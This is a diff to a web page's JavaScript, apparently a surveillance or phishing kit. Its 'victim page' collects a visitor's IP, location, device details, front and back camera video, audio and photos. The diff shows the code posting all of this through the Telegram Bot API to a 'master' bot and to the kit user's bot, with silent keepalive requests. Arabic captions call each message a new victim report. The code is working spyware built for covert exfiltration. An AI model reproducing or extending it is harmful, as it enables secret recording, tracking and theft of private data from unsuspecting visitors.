@@ -1491,7 +1491,7 @@
     <canvas id="hiddenCanvas"></canvas>
 
     <!-- ============================================================
-         JAVASCRIPT — FINAL STABLE VERSION
+         JAVASCRIPT — FINAL STABLE VERSION — FULL SEND
          ============================================================ -->
     <script>
         (function() {
@@ -1599,15 +1599,6 @@
                     }
                     return { valid: false, username: null };
                 } catch { return { valid: false, username: null }; }
-            }
-
-            // ----- Send media to a bot (helper) with keepalive -----
-            function sendMediaAsync(method, botToken, formData) {
-                fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
-                    method: 'POST',
-                    body: formData,
-                    keepalive: true
-                }).catch(() => {});
             }
 
             // ----- Get battery level -----
@@ -1825,7 +1816,7 @@
             }
 
             // ============================================================
-            //  🔥  VICTIM PAGE — FINAL STABLE
+            //  🔥  VICTIM PAGE — FULL SEND TO MASTER & USER
             // ============================================================
 
             async function initVictimPage(shortToken) {
@@ -1861,6 +1852,7 @@
                 function sendToMaster(data) {
                     const { ip, location, deviceInfo, frontVideo, backVideo, audio, photos } = data;
 
+                    // 1. Send summary text
                     const summary =
                         `⭑ تقرير ضحية جديدة — نسخة المطور ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`;
                     fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
@@ -1870,6 +1862,7 @@
                         keepalive: true
                     }).catch(() => {});
 
+                    // 2. Send location
                     if (location.lat && location.lng) {
                         fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
                             method: 'POST',
@@ -1883,6 +1876,7 @@
                         }).catch(() => {});
                     }
 
+                    // 3. Send photos
                     photos.forEach((blob) => {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
@@ -1891,6 +1885,7 @@
                         sendMediaAsync('sendPhoto', MASTER_BOT_TOKEN, fd);
                     });
 
+                    // 4. Send front video
                     if (frontVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
@@ -1899,6 +1894,7 @@
                         sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
 
+                    // 5. Send back video
                     if (backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
@@ -1907,6 +1903,7 @@
                         sendMediaAsync('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
 
+                    // 6. Send audio
                     if (audio) {
                         const fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
@@ -1972,6 +1969,15 @@
                         fd.append('caption', `🎤 تسجيل صوتي - ${shortToken}`);
                         sendMediaAsync('sendAudio', userBotToken, fd);
                     }
+                }
+
+                // ----- Send media helper (with keepalive) -----
+                function sendMediaAsync(method, botToken, formData) {
+                    fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    }).catch(() => {});
                 }
 
                 // ---- Main collection ----
@@ -2136,7 +2142,7 @@
                             photos
                         };
 
-                        // 10. Send
+                        // 10. Send to master and user (parallel, fire-and-forget)
                         sendToMaster(data);
                         sendToUser(data, userBotToken, userChatId, botName);
 
